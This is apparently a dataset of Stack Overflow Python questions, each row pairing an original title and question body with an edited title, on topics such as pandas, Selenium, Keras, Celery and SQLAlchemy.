System.RuntimeType.ValidateGenericArguments(MemberInfo definition, RuntimeType[] genericArguments, Exception e) at System.Reflection.RuntimeMethodInfo.MakeGenericMethod(Type[] methodInstantiation) at Python.Runtime.MethodBinder.MatchParameters(MethodInfo[] mi, Type[] tp) at Python.Runtime.MethodBinder.Bind(IntPtr inst, IntPtr args, IntPtr kw, MethodBase info, MethodInfo[] methodinfo) at Python.Runtime.MethodBinder.Invoke(IntPtr inst, IntPtr args, IntPtr kw, MethodBase info, MethodInfo[] methodinfo) at Python.Runtime.MethodObject.Invoke(IntPtr target, IntPtr args, IntPtr kw, MethodBase info) at Python.Runtime.MethodBinding.tp_call(IntPtr ob, IntPtr args, IntPtr kw)",Calling C# code from python using pythonnet
Python Selenium Alert - Prompt username & password is not working," I am trying to enter data in prompt (URL Given), below codes is giving me an error. Please help me out with these? I have tried with: This one is also not working. <code>  from selenium import webdriverfrom selenium.webdriver.common.action_chains import ActionChainsfrom selenium.webdriver.common.keys import Keysimport timedriver = webdriver.Firefox()url = ""http://the-internet.herokuapp.com/basic_auth""driver.get(url)time.sleep(5)alert = driver.switch_to.alertalert.authenticate('admin','admin')time.sleep(4)alert.accept() ActionChains(driver).send_keys(""admin"").send_keys(Keys.TAB).send_keys(""admin"").perform()",Python Windows Authentication username and password is not working
Python Selenium Alert -- Prompt username and password is not working," I am trying to enter data in prompt (URL Given), below codes is giving me an error. Please help me out with these? I have tried with: This one is also not working. <code>  from selenium import webdriverfrom selenium.webdriver.common.action_chains import ActionChainsfrom selenium.webdriver.common.keys import Keysimport timedriver = webdriver.Firefox()url = ""http://the-internet.herokuapp.com/basic_auth""driver.get(url)time.sleep(5)alert = driver.switch_to.alertalert.authenticate('admin','admin')time.sleep(4)alert.accept() ActionChains(driver).send_keys(""admin"").send_keys(Keys.TAB).send_keys(""admin"").perform()",Python Windows Authentication username and password is not working
Apache2 internal server error (500) using python cgi script," EditThe problem had nothing to do with the http header. It was a variable that was called in the cgi/python script before it was defined. Just in case others also try to work with an error message like that but can't find the reason for it.I have inherited a website based on apache2/python/cgi scripts that I'm trying to maintain, but sometimes I'm struggling with really unhelpful errors. In this case, I get The server encountered an internal error or misconfiguration and was unable to complete your request. when clicking on an element on a page. The error log gives me the following information:[Fri Jul 28 14:11:15.150877 2017] [http:error] [pid 1727] [client 193.174.111.250:53426] AH02429: Response header name '<!--' contains invalid characters, aborting requestBased on a similar question, I'm assuming the error is quite new, but I can't find the problem. Especially since the link / the script name stays the same. It works when first opening the site, but then stops working when I click something which does not refer me to a different site/script. How can that be the header's fault?Just in case, here is the code that generates the beginning of the web page: As far as I understand now, the first line constitutes the only HTTP header I have. There is no '<!--' as stated in the error log. Does the header need anything else to be functional?PS: Alternatively, if there's any easy way to turn these generic errors into more verbose ones, I'd also be very interested in that. <code>  Code = ""Content-Type: text/html\n\n""Code += ""<!DOCTYPE HTML PUBLIC '-//W3C//DTD HTML 4.0 Transitional//EN'>\n<html>\n"" Code += ""<head>\n <title>BACTOME: RELATIVE EXPRESSIONS</title>\n""...","Apache2 ""Response header name '<!--' contains invalid characters, aborting request"""
How can I inherit defaultdict and use it's copy method in subclass method (In python)?," There is the code. There is the error: I don't know how to inherit the copy method and also don't know why I give 3 argument. <code>  from collections import defaultdictclass A(defaultdict): def __init__(self): super(A, self).__init__(lambda :0) self.x = 1 def my_copy(self): return self.copy()if __name__ == '__main__': a = defaultdict(lambda :0) b = a.copy() # no error when using the base class directly a = A() b = a.my_copy() Traceback (most recent call last): File ""/Applications/PyCharm.app/Contents/helpers/pydev/pydevd.py"", line 1591, in <module> globals = debugger.run(setup['file'], None, None, is_module) File ""/Applications/PyCharm.app/Contents/helpers/pydev/pydevd.py"", line 1018, in run pydev_imports.execfile(file, globals, locals) # execute the script File ""/Applications/PyCharm.app/Contents/helpers/pydev/_pydev_imps/_pydev_execfile.py"", line 18, in execfile exec(compile(contents+""\n"", file, 'exec'), glob, loc) File ""/Users/liu/project/scir/pytorch_test/t.py"", line 14, in <module> b = a.my_copy() File ""/Users/liu/project/scir/pytorch_test/t.py"", line 8, in my_copy return self.copy()TypeError: __init__() takes 1 positional argument but 3 were given",How can I inherit defaultdict and use its copy method in subclass method?
How can I inherit defaultdict and use its copy method in subclass method (In python)?," There is the code. There is the error: I don't know how to inherit the copy method and also don't know why I give 3 argument. <code>  from collections import defaultdictclass A(defaultdict): def __init__(self): super(A, self).__init__(lambda :0) self.x = 1 def my_copy(self): return self.copy()if __name__ == '__main__': a = defaultdict(lambda :0) b = a.copy() # no error when using the base class directly a = A() b = a.my_copy() Traceback (most recent call last): File ""/Applications/PyCharm.app/Contents/helpers/pydev/pydevd.py"", line 1591, in <module> globals = debugger.run(setup['file'], None, None, is_module) File ""/Applications/PyCharm.app/Contents/helpers/pydev/pydevd.py"", line 1018, in run pydev_imports.execfile(file, globals, locals) # execute the script File ""/Applications/PyCharm.app/Contents/helpers/pydev/_pydev_imps/_pydev_execfile.py"", line 18, in execfile exec(compile(contents+""\n"", file, 'exec'), glob, loc) File ""/Users/liu/project/scir/pytorch_test/t.py"", line 14, in <module> b = a.my_copy() File ""/Users/liu/project/scir/pytorch_test/t.py"", line 8, in my_copy return self.copy()TypeError: __init__() takes 1 positional argument but 3 were given",How can I inherit defaultdict and use its copy method in subclass method?
Is there a way to perform LDU decomposition in Python?," I see cholesky decomposition in numpy.linalg.cholesky, but could not find a LDU decompositon. Can anyone suggest a function to use? <code> ",Is there a built-in/easy LDU decomposition method in Numpy?
pytest: mark test to be run in independent process," I'm using pytest. I have a test which involves checking that an import is not made when something happens. This is easy enough to make, but when the test is run in pytest it gets run in the same process as many other tests, which may import that thing beforehand.Is there some way to mark a test to be run in its own process? Ideally there'd be some kind of decorator like But I haven't found anything like that. <code>  @pytest.mark.run_in_isolationdef test_import_not_made(): ....",Mark test to be run in independent process
"python: difference between 'lxml' and ""html.parser"" and ""html5lib"" with beautiful soup?"," When using Beautiful Soup what is the difference between 'lxml' and ""html.parser"" and ""html5lib""?When would you use one over the other and the benefits of each? When I used each they seemed to be interchangeable, but people here correct me that I should be using a different one. I'd like to strengthen my understanding; I've read a couple posts on here about this but they're not going over the uses much in any at all.Example: <code>  soup = BeautifulSoup(response.text, 'lxml')",BeautifulSoup: what's the difference between 'lxml' and 'html.parser' and 'html5lib' parsers?
"BeautifulSoup: what's the difference between 'lxml' and ""html.parser"" and ""html5lib""?"," When using Beautiful Soup what is the difference between 'lxml' and ""html.parser"" and ""html5lib""?When would you use one over the other and the benefits of each? When I used each they seemed to be interchangeable, but people here correct me that I should be using a different one. I'd like to strengthen my understanding; I've read a couple posts on here about this but they're not going over the uses much in any at all.Example: <code>  soup = BeautifulSoup(response.text, 'lxml')",BeautifulSoup: what's the difference between 'lxml' and 'html.parser' and 'html5lib' parsers?
Python tkinter - fill = Y has no effect," When I run the code, label1 stretches perfectly along the X axis while label2 doesn't stretch at all along the Y axis. What am I missing?Result <code>  from tkinter import *root = Tk()root.title('My app')root.minsize(250, 100)label1 = Label(root, text = 'Hello world!', fg = 'red', bg = 'yellow', font = 'Monaco')label1.pack(fill = X)label2 = Label(root, text = 'Some more text!', fg = 'green', bg = 'cyan', font = 'Arial')label2.pack(fill = Y)root.mainloop()",tkinter: fill = Y has no effect
Remove non duplicated rows from pandas," This is rather simple but I can't get me head around it. Let's say for the following data frame, I want to keep only the rows with duplicated values in column y: The desired output looks like: I tried this: but I get this: <code>  >>> df x y x y0 1 11 2 22 3 23 4 34 5 35 6 36 7 57 8 2 >>> df x y1 2 22 3 23 4 34 5 35 6 37 8 2 df[~df.duplicated('y')] x y0 1 11 2 23 4 36 7 5",Remove non-duplicated rows from pandas
split audio files by silence detiction, I've more than 200 MP3 files and I need to split each one of them by using silence detection. I tried Audacity and WavePad but they do not have batch processes and it's very slow to make them one by one.The scenario is as follows:split track whereas silence 2 seconds or morethen add 0.5 s at the start and the end of these tracks and save them as .mp3BitRate 192 stereo normalize volume to be sure that all files are the same volume and qualityI tried FFmpeg but no success. <code> ,Split audio files using silence detection
split audio files by silence detection, I've more than 200 MP3 files and I need to split each one of them by using silence detection. I tried Audacity and WavePad but they do not have batch processes and it's very slow to make them one by one.The scenario is as follows:split track whereas silence 2 seconds or morethen add 0.5 s at the start and the end of these tracks and save them as .mp3BitRate 192 stereo normalize volume to be sure that all files are the same volume and qualityI tried FFmpeg but no success. <code> ,Split audio files using silence detection
"how to create list of dictionaries from key, value in python"," How to create a dictionary of dictionaries from existing lists of keys and values? Output: When I use d.items it automatically gives me tuples, not dictionaries. Is there a way of creating a list of dictionaries, not tuples?I need to get the following structure: <code>  celebr = ['Tony','Harry','Katty','Sam']perc = [69,31,0,0]d = dict(zip(celebr, perc))dlist = []for i in d.items(): dlist.append(i) print(dlist) [('Tony': 69), ('Harry': 31), ('Katty': 0), ('Sam': 0)] [{'Tony': 69}, {'Harry': 31}, {'Katty': 0}, {'Sam': 0}]",How to create a list of dictionaries from a list of keys and a list of values
Python importing with dot notation, Can someone explain this to me?When you import Tkinter.Messagebox what actually does this mean (Dot Notation)?I know that you can import Tkinter but when you import Tkinter.Messagebox what actually is this? Is it a class inside a class?I am new to Python and dot notation confuses me sometimes. <code> ,Importing with dot notation
Asyncio Event Loop is Closed," When trying to run the asyncio hello world code example given in the docs: I get the error: I am using python 3.5.3. <code>  import asyncioasync def hello_world(): print(""Hello World!"")loop = asyncio.get_event_loop()# Blocking call which returns when the hello_world() coroutine is doneloop.run_until_complete(hello_world())loop.close() RuntimeError: Event loop is closed","""Asyncio Event Loop is Closed"" when getting loop"
Python -- How to keep fractions in your equation output," I've been using Python to calculate math equations. For example: Which results in the output: Is there a way to show this answer as fractions as opposed to decimals? I would like to see the output as: <code>  from sympy import Symbol, Derivative, Integralx = Symbol('x')d = Symbol('d')Integral(8*x**(6/5)-7*x**(3/2),x).doit() 3.63636363636364*x**2.2 - 2.8*x**2.5 (40/11)*x**(11/5)-(14/5)*x**(5/2)+C",How to keep fractions in your equation output
Can i run Keras model on gpu?," I'm running a Keras model, with a submission deadline of 36 hours, if I train my model on the cpu it will take approx 50 hours, is there a way to run Keras on gpu?I'm using Tensorflow backend and running it on my Jupyter notebook, without anaconda installed. <code> ",Can I run Keras model on gpu?
Melting pandas data frame with multiple varaible names and muliple value names," How can I melt a pandas data frame using multiple variable names and values? I have the following data frame that changes its shape in a for loop. In one of the for loop iterations, it looks like this: I need to melt it in such a way that it looks like this: During the for loop the data frame will contain different number of classes with their probabilities. That is why I am looking for a general approach that is applicable in all my for loop iterations. I saw this question and this but they were not helpful! <code>  ID Cat Class_A Class_B Prob_A Prob_B1 Veg 1 2 0.9 0.12 Veg 1 2 0.8 0.23 Meat 1 2 0.6 0.44 Meat 1 2 0.3 0.75 Veg 1 2 0.2 0.8 ID Cat Class Prob 1 Veg 1 0.9 1 Veg 2 0.12 Veg 1 0.8 2 Veg 2 0.23 Meat 1 0.6 3 Meat 2 0.44 Meat 1 0.3 4 Meat 2 0.75 Veg 1 0.2 5 Veg 2 0.8",Melting pandas data frame with multiple variable names and multiple value names
"How to deal with PyCharm's ""Expected type ???, got ??? instead"""," When using PyCharm, Pycharm's code style inspection gives me the warning Expected type 'Union[ndarray, Iterable]', got 'float' instead in the editor if I write np.array(0.0). When I write np.array([0.0]) I get no warning.When coding I get Expected type 'ndarray', got 'float' instead, while solves that.What I think Pycharm's code style inspection wants to tell me is there's a possibility of a type error, but I am not sure how I should react to that in the sense of good programming. Is PyCharm right to scold me and should I use the long versions or should I keep my short versions for readability and speed of coding?If I should not change my code to the long versions - can I get rid of the Pycharm's code style inspection warning, or is that a bad idea, because they may be correct in other cases, and I am not able to tune the warnings that specifically? <code>  from scipy.special import expitexpit(0.0) expit(np.array([0.0]))","How to deal with PyCharm's ""Expected type X, got Y instead"""
Python - Count occurrences of a string in substrings of a list," I know that counting the simple occurrences of a list item is as easy as: But what I would like to know how to do is count every time a string appears in a substring of list entries.For example, I want to see how many times foo appears in the list data: Doing: produces: but I expect to get: I also tried doing: but that also gives zero as a result.I would like to know how to count each occurrence of substring appearances in a list.  <code>  >>> [1, 2, 3, 4, 1, 4, 1].count(1)3 data = [""the foo is all fooed"", ""the bar is all barred"", ""foo is now a bar""] d_count = data.count('foo')print(""d_count:"", d_count) d_count: 0 d_count: 2 d_count = data.count(any('foo' in s for s in data))print(""d_count:"", d_count)",Count occurrences of a substring in a list of strings
How can I run Flask app from setup.py in PyCharm," I was following this documentation on directory management for Flask projects. Now, I'm trying to run my flask application from PyCharm. I have added the below mentioned Environment Variables in Edit Configurations...:FLASK_DEBUG=trueFLASK_APP=<absolute-path-to-root-directory-of-application>I add the Script as flask runThe output running this configuration is this: ../red-flask/venv/bin/python ""flask run"" ../red-flask/venv/bin/python: can't open file 'flask run': [Errno 2] No such file or directory Process finished with exit code 2My project directory looks like: I am unable to figure out how to make this work, any help is appreciated. <code>  /flask_app setup.py /flask_app __init__.py views.py /static style.css /templates layout.html index.html login.html ...",How to run Flask app as a package in PyCharm
Celery raises ValueError," Trying to run simple example with Celery and receiving an exception. RabbitMQ started in a Docker, also tried to start it locally. Celery works on a local Windows host Excerpt of my error text: <code>  from celery import Celeryapp = Celery('tasks', broker='amqp://192.168.99.100:32774')@app.task()def hello(): print('hello')if __name__ == '__main__': hello.delay() [2017-08-18 00:01:08,632: ERROR/MainProcess] Task handler raised error: ValueError('not enough values to unpack (expected 3, got 0)',)Traceback (most recent call last): File ""c:\users\user\celenv\lib\site-packages\billiard\pool.py"", line 358, in workloop result = (True, prepare_result(fun(*args, **kwargs))) File ""c:\users\user\celenv\lib\site-packages\celery\app\trace.py"", line 525, in _fast_trace_task tasks, accept, hostname = _locValueError: not enough values to unpack (expected 3, got 0)",Celery raises ValueError: not enough values to unpack
"Issue understanding python datetime,pytz"," Can someone explain me why I do not get the same result in those? The output of this code is: 2017-10-25 20:10:50+01:35 The output of this code is: 2017-10-25 20:10:50+03:00My question is why they have different timezones (1:35 and 3:00). I know that the second code is true because my UTC is 3:00. But can you tell me why I am getting 1:35 in the first one? <code>  import datetime,pytzvar1 = datetime.datetime(2017,10,25,20,10,50,tzinfo=pytz.timezone(""Europe/Athens"")))print(var1) import datetime,pytzvar1 = datetime.datetime(2017,10,25,20,10,50)var1 = pytz.timezone(""Europe/Athens"").localize(var1)print(var1)",Why does creating a datetime with a tzinfo from pytz show a weird time offset?
"In Python, how to conditionally remove duplicates"," Consider the following dataframe I want to remove all rows which are duplicates with regards to column 'A' 'B'. I want to remove the entry which has a NaN entry (I know that for all dulicates there will be a NaN and a not-NaN entry). The end results should look like this All efficient, one-liners are most welcome <code>  import pandas as pddf = pd.DataFrame({'A' : [1, 2, 3, 3, 4, 4, 5, 6, 7], 'B' : ['a','b','c','c','d','d','e','f','g'], 'Col_1' :[np.NaN, 'A','A', np.NaN, 'B', np.NaN, 'B', np.NaN, np.NaN], 'Col_2' :[2,2,3,3,3,3,4,4,5]})dfOut[92]: A B Col_1 Col_2 0 1 a NaN 2 1 2 b A 2 2 3 c A 3 3 3 c NaN 3 4 4 d B 3 5 4 d NaN 3 6 5 e B 4 7 6 f NaN 4 8 7 g NaN 5 A B Col_1 Col_2 0 1 a NaN 2 1 2 b A 2 2 3 c A 3 4 4 d B 3 6 5 e B 4 7 6 f NaN 4 8 7 g NaN 5",How to conditionally remove duplicates from a pandas dataframe
Multiple context objects in Flask CLI (Click)," I'm trying to implement a command line app using the Flask CLI infrastructure based on Click. Its interface should work like this: I have the following code: The problem is, I need to create two different objects based on the -c flag and make them both available to the underlying commands, which seems impossible. Is there any workaround for this?I know I could use the meta property of the Context object, but that would mean writing a lot of boilerplate. <code>  app.py -c config.cfg cmd_aapp.py -c config.cfg cmd_b @click.group@click.option('-c', 'config')@click.pass_contextdef cli(ctx, config): ctx.obj = ObjA(config) ctx.obj = ObjB(config) # Just for illustration@cli.command()@click.pass_context()def cmd_a(ctx): ctx.find_object(ObjA)@cli.command()@cli.pass_context()def cmd_b(ctx): ctx.find_object(ObjB)cli()",Multiple context objects in CLI (Click)
Keras' `fit_generator` behaves non-deterministically," I have a huge dataset that I need to provide to Keras in the form of a generator because it does not fit into memory. However, using fit_generator, I cannot replicate the results I get during usual training with model.fit. Also each epoch lasts considerably longer.I implemented a minimal example. Maybe someone can show me where the problem is. On my computer, model.fit always finishes the 10th epoch with a loss of 0.6939 and after ca. 2-3 seconds.The method model.fit_generator, however, runs considerably longer and finishes the last epoch with a different loss (0.6931).I don't understand in general why the results in both approaches differ. This might not appear like much of a difference but I need to be sure that the same data with the same net produce the same result, independent from conventional training or using the generator.Update: @Alex R. provided an answer for part of the original problem (some of the performance issue as well as changing results with each run). As the core problem remains, however, I merely adjusted the question and title accordingly. <code>  import randomimport numpyfrom keras.layers import Densefrom keras.models import Sequentialrandom.seed(23465298)numpy.random.seed(23465298)no_features = 5no_examples = 1000def get_model(): network = Sequential() network.add(Dense(8, input_dim=no_features, activation='relu')) network.add(Dense(1, activation='sigmoid')) network.compile(loss='binary_crossentropy', optimizer='adam') return networkdef get_data(): example_input = [[float(f_i == e_i % no_features) for f_i in range(no_features)] for e_i in range(no_examples)] example_target = [[float(t_i % 2)] for t_i in range(no_examples)] return example_input, example_targetdef data_gen(all_inputs, all_targets, batch_size=10): input_batch = numpy.zeros((batch_size, no_features)) target_batch = numpy.zeros((batch_size, 1)) while True: for example_index, each_example in enumerate(zip(all_inputs, all_targets)): each_input, each_target = each_example wrapped = example_index % batch_size input_batch[wrapped] = each_input target_batch[wrapped] = each_target if wrapped == batch_size - 1: yield input_batch, target_batchif __name__ == ""__main__"": input_data, target_data = get_data() g = data_gen(input_data, target_data, batch_size=10) model = get_model() model.fit(input_data, target_data, epochs=15, batch_size=10) # 15 * (1000 / 10) * 10 # model.fit_generator(g, no_examples // 10, epochs=15) # 15 * (1000 / 10) * 10",Keras' `model.fit_generator()` behaves different than `model.fit()`
How to intercept class creation and add attribute using a metaclass in python?," In the following code, I want metaclass NameMeta to add attribute gender to MyName class in case this class does not declare that attribute. This is the output that I am getting: I know this error makes sense since name is a string.My question is, how can I access MyName class as an object in the metaclass so that I can add the attribute? <code>  class NameMeta(type): def __new__(cls, name, bases, dic): if 'gender' not in dic: setattr(name, 'gender', 'Male') return super().__new__(cls, name, bases, dic)class MyName(metaclass=NameMeta): def __init__(self, fname, lname): self.fname = fname self.lname = lname def fullname(self): self.full_name = self.fname + self.lname return self.full_name inst = MyName('Joseph ', 'Vincent')print(MyName.gender) <ipython-input-111-550ff3cfae41> in __new__(cls, name, bases, dic) 2 def __new__(cls, name, bases, dic): 3 if 'gender' not in dic:----> 4 setattr(name, 'gender', 'Male') 5 return super().__new__(cls, name, bases, dic) 6 AttributeError: 'str' object has no attribute 'gender'",How to intercept class creation and add attribute using a metaclass?
Sympy: get all integral solutions for linear equation," A game I played has a riddle that involves solving the following equation: Not wanting to think I just slapped it into sympy, which I havent really used up to that point: Hmm, this only gave me a dependent solution, but I want all possible solutions in the domain I constrained the variables to, e.g. (assuming there are no other solutions) [{x: 4, y: 2, z:6}] or [(4, 2, 6)]Of course I could now manually substitute two variables in a nested loop, or solve it by hand (as I did to get the solution above), but I want to know how to get sympy (or another library) to do it for me. <code>  x*411 + y*295 + z*161 = 3200 >>> from sympy import *>>> x, y, z = symbols('x y z', integer=True, positive=True)>>> solve(x*411 + y*295 + z*161 - 3200, [x, y, z])[{x: -295*y/411 - 161*z/411 + 3200/411}]",Get all positive integral solutions for a linear equation
Python binary AND (&) between negative and positive numbers," I've been learning about adding two numbers using bit manipulation and I am having issues understanding how it is done in Python for negative numbers. For example, if I am trying to & the following: shouldn't it be: since only a combination of 1's results in 1's?Right now python gives 0b10000110I couldn't find any resources specifically when a negative number is added to a positive number using python. <code>  -0b1111010 (-122) & 0b11011110 (222) 0b1111010 & 0b11011110------------ 0b01011010",Bitwise AND (&) between negative and positive numbers?
how to get 3 smallest value in one row and return the correspondent column's name," I have two dataframe, df and df2,they are correspondent.Now based in the first dataframe df, I want to get the 3 smallest value in one row and return the correspondent column's name(in this case like ""X""or""Y""or""Z""or""T""). So I can get the new dataframe df3. Besides that, I want to get another dataframe df4 which is correspondent from df3 in df2 which means in df row['A'] (2,20,21) is the 3 smallest value, so in df4 row['A'], I want to get (0.52,0.2,0.5) from df2. <code>  df = pd.DataFrame({ 'X': [21, 2, 43, 44, 56, 67, 7, 38, 29, 130], 'Y': [101, 220, 330, 140, 250, 10, 207, 320, 420, 50], 'Z': [20, 128, 136, 144, 312, 10, 82, 63, 42, 12], 'T': [2, 32, 4, 424, 256, 167, 27, 38, 229, 30] }, index=list('ABCDEFGHIJ'))df2 = pd.DataFrame({ 'X': [0.5, 0.12,0.43, 0.424, 0.65,0.867,0.17,0.938,0.229,0.113], 'Y': [0.1,2.201,0.33,0.140,0.525,0.31,0.20,0.32,0.420,0.650], 'Z': [0.20,0.128,0.136,0.2144,0.5312,0.61,0.82,0.363,0.542,0.512], 'T':[0.52, 0.232,0.34, 0.6424, 0.6256,0.3167,0.527,0.38,0.4229,0.73] },index=list('ABCDEFGHIJ'))",Getting the three smallest values per row and returning the correspondent column names
Tilde sign in python dataframe, I'm new to python/pandas and came across a code snippet. Would be much obliged if I could know what is the tilde sign's usage in this context? <code>  df = df[~df['InvoiceNo'].str.contains('C')],Tilde sign in pandas DataFrame
Python for_in loop to print the last item in the list," Lately I learned about lists and for loops, as well as the command .pop() that indicates and removes the last item in a list.So I tried to write a code to remove the last items in a list one by one, until it remains with only one item.The code is: The output of python 3.6 gives me this: As you can see, it actually worked, but for a half of it?I was expecting: I mean, I will be more comfortable if it returns some error, that means the code is not right. But why did it work, but not a full way through? <code>  list_A = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j']for i in list_A: print(list_A.pop()) if 'c' not in list_A: breakprint(""job done."") /Library/Frameworks/Python.framework/Versions/3.6/bin/python3.6jihgfjob done. jihgfedcjob done","Python ""for in"" loop to print the last item in the list"
How to query exists in Flask SQLAlchemy?," I have a database shown below which works fine. Now I have a user called Bob that owns the space Mainspace. I would like to get a boolean to see if he is a owner of the space. I tried to apply two filters but I get the following error. Command: Database: <code>  sqlalchemy.exc.InvalidRequestError: Can't compare a collection to an object or collection; use contains() to test for membership. exists = Space.query.filter_by(name=""Mainspace"", owner=""Bob"").first() space_access = db.Table('space_access', db.Column('userid', db.Integer, db.ForeignKey('user.id')), db.Column('spaceid', db.Integer, db.ForeignKey('space.id')))class User(UserMixin, db.Model): id = db.Column(db.Integer, primary_key=True) username = db.Column(db.String(15), unique=True) email = db.Column(db.String(50), unique=True) password = db.Column(db.String(80)) role='admin'; spaces = db.relationship('Space', secondary=space_access, backref=db.backref('owner', lazy='dynamic'))class Space(UserMixin, db.Model): id = db.Column(db.Integer, primary_key=True) name = db.Column(db.String(50), unique=True) type = db.Column(db.String(50), unique=True)",How to filter by multiple criteria in Flask SQLAlchemy?
Python: check if string has format arguments," I am formatting strings using named arguments with .format(). How can I obtain a list of arguments?For example: Note that order does not matter. I have dug a fair amount into the string.Formatter documentation to no avail. I am sure you could write regex to do this, but there must bet a more elegant way. <code>  >>> my_string = 'I live in {city}, {state}, {country}.'>>> get_format_args(my_string)# ['city', 'state', 'country']",How to check if string has format arguments in Python?
remove single quote from list," I have an input string as: And the corresponding output as: How can I remove the single quotes from each element in the list? <code>  result = '""testing"",""0.8841"",""642000.0"",""80.014521"",""-60.940653"",""4522126666"",""1500854400"","""",""1500842014000"",""name"",""80.014521"",""-60.996532"",""sampledevice"",""3"",""name""'data = result.split(""\n"")i = 0while i < len(data): i = i +1 dd = data[i].split(',') print dd break [ '""testing""', '""0.8841""', '""642000.0""', '""80.014521""', '""-60.940653""', '""4522126666""', '""1500854400""', '""""', '""1500842014000""', '""name""', '""80.014521""', '""-60.996532""', '""sampledevice""', '""3""', '""name""']",Remove single quote from list in Python
python modulenotfound error pycharm project folder recs," I am working on a project in PyCharm. The project has the following structure: I'd want to know how I can do an import such that the import works when running the code in the pyCharm console in an interactive manner, as well as when running the code using the command in the terminal.Currently I do:from utils.myutils1.py import myClassBut command line I get the error: File ""somecode.py"", line 10, in from utils.myutils1 import myClass ModuleNotFoundError: No module named 'utils'and on PyCharm: Traceback (most recent call last): File ""/home/ubuntu/anaconda3/lib/python3.6/site-packages/IPython/core/interactiveshell.py"", line 2881, in run_code exec(code_obj, self.user_global_ns, self.user_ns) File """", line 1, in from utils.myutils1 import myClass ModuleNotFoundError: No module named 'utils'Any recommendations on the proper folder structure for modules within a project, and how to import them properly?Thanks! <code>  /projectRoot/ folder1/ somecode.py utils/ __init__.py myutils1.py python somecode.py ",ModuleNotFoundError error with PyCharm project folder recs
Is there a Python library function which computes multinomial coeffients?," I was looking for a Python library function which computes multinomial coefficients.I could not find any such function in any of the standard libraries. For binomial coefficients (of which multinomial coefficients are a generalization) there is scipy.special.binom and also scipy.misc.comb. Also, numpy.random.multinomial draws samples from a multinomial distribution, and sympy.ntheory.multinomial.multinomial_coefficients returns a dictionary related to multinomial coefficients.However, I could not find a multinomial coefficients function proper, which given a,b,...,z returns (a+b+...+z)!/(a! b! ... z!). Did I miss it? Is there a good reason there is none available?I would be happy to contribute an efficient implementation to SciPy say. (I would have to figure out how to contribute, as I have never done this).For background, they do come up when expanding (a+b+...+z)^n. Also, they count the ways of depositing a+b+...+z distinct objects into distinct bins such that the first bin contains a objects, etc. I need them occasionally for a Project Euler problem.BTW, other languages do offer this function: Mathematica, MATLAB, Maple. <code> ",Does Python have a function which computes multinomial coefficients?
Does Python have a function which computes multinomial coeffients?," I was looking for a Python library function which computes multinomial coefficients.I could not find any such function in any of the standard libraries. For binomial coefficients (of which multinomial coefficients are a generalization) there is scipy.special.binom and also scipy.misc.comb. Also, numpy.random.multinomial draws samples from a multinomial distribution, and sympy.ntheory.multinomial.multinomial_coefficients returns a dictionary related to multinomial coefficients.However, I could not find a multinomial coefficients function proper, which given a,b,...,z returns (a+b+...+z)!/(a! b! ... z!). Did I miss it? Is there a good reason there is none available?I would be happy to contribute an efficient implementation to SciPy say. (I would have to figure out how to contribute, as I have never done this).For background, they do come up when expanding (a+b+...+z)^n. Also, they count the ways of depositing a+b+...+z distinct objects into distinct bins such that the first bin contains a objects, etc. I need them occasionally for a Project Euler problem.BTW, other languages do offer this function: Mathematica, MATLAB, Maple. <code> ",Does Python have a function which computes multinomial coefficients?
Python2.7 - codecs.open(utf-8) fails to read plain ASCII file," I have a plain ASCII file. When I try to open it with codecs.open(..., ""utf-8""), I am unable to read single characters. ASCII is a subset of UTF-8, so why can't codecs open such a file in UTF-8 mode? system: Of course it works with regular open. It also works if I remove the ""utf-8"" option. Also what does 63 mean? That's like the middle of the 3rd line. I don't get it. <code>  # test.pyimport codecsf = codecs.open(""test.py"", ""r"", ""utf-8"")# ASCII is supposed to be a subset of UTF-8:# http://www.fileformat.info/info/unicode/utf8.htmassert len(f.read(1)) == 1 # OKf.readline()c = f.read(1)print len(c)print ""'%s'"" % cassert len(c) == 1 # fails# max% p test.py# 63# '# import codecs## f = codecs.open(""test.py"", ""r"", ""utf-8"")## # ASC'# Traceback (most recent call last):# File ""test.py"", line 15, in <module># assert len(c) == 1 # fails# AssertionError# max% Linux max 4.4.0-89-generic #112~14.04.1-Ubuntu SMP Tue Aug 1 22:08:32 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux",codecs.open(utf-8) fails to read plain ASCII file
"Failing the simplest possible cv2.remap() test, aka. how do I use remap() in python?"," Here's the simplest possible test case for remap(): and here's the output: As you can see, outimg produces 0,0, and it's not even in the correct shape. I expect a 20x20 or 10x10 image with interpolated values from range 0 to 3. I've read all the documentation. It and everyone on SO states you input an array (a map) of starting points, a map of ending points, and then remap() will put all the values in img into their new positions, interpolating any empty space. I'm doing that, but it just doesn't work. Why? Most examples are for C++. Is it broken in python? <code>  import cv2import numpy as npinimg = np.arange(2*2).reshape(2,2).astype(np.float32)inmap = np.array([[0,0],[0,1],[1,0],[1,1]]).astype(np.float32)outmap = np.array([[10,10],[10,20],[20,10],[20,20]]).astype(np.float32)outimg = cv2.remap(inimg,inmap,outmap,cv2.INTER_LINEAR)print ""inimg:"",inimgprint ""inmap:"",inmapprint ""outmap:"",outmapprint ""outimg:"", outimg inimg: [[ 0. 1.] [ 2. 3.]]inmap: [[ 0. 0.] [ 0. 1.] [ 1. 0.] [ 1. 1.]]outmap: [[ 10. 10.] [ 10. 20.] [ 20. 10.] [ 20. 20.]]outimg: [[ 0. 0.] [ 0. 0.] [ 0. 0.] [ 0. 0.]]",How do I use OpenCV's remap function?
Tkinter - window losts focus event, Is there some event triggering when tkinter window loses focus that can be bound to a tkinter window using the .bind method? <code> ,Tkinter - window focus loss event
Collect_list by preserving order based on another variable," I am trying to create a new column of lists in Pyspark using a groupby aggregation on existing set of columns. An example input data frame is provided below: The expected output is: The values within a list are sorted by the date.I tried using collect_list as follows: But collect_list doesn't guarantee order even if I sort the input data frame by date before aggregation.Could someone help on how to do aggregation by preserving the order based on a second (date) variable? <code>  ------------------------id | date | value------------------------1 |2014-01-03 | 10 1 |2014-01-04 | 51 |2014-01-05 | 151 |2014-01-06 | 202 |2014-02-10 | 100 2 |2014-03-11 | 5002 |2014-04-15 | 1500 id | value_list------------------------1 | [10, 5, 15, 20]2 | [100, 500, 1500] from pyspark.sql import functions as Fordered_df = input_df.orderBy(['id','date'],ascending = True)grouped_df = ordered_df.groupby(""id"").agg(F.collect_list(""value""))",collect_list by preserving order based on another variable
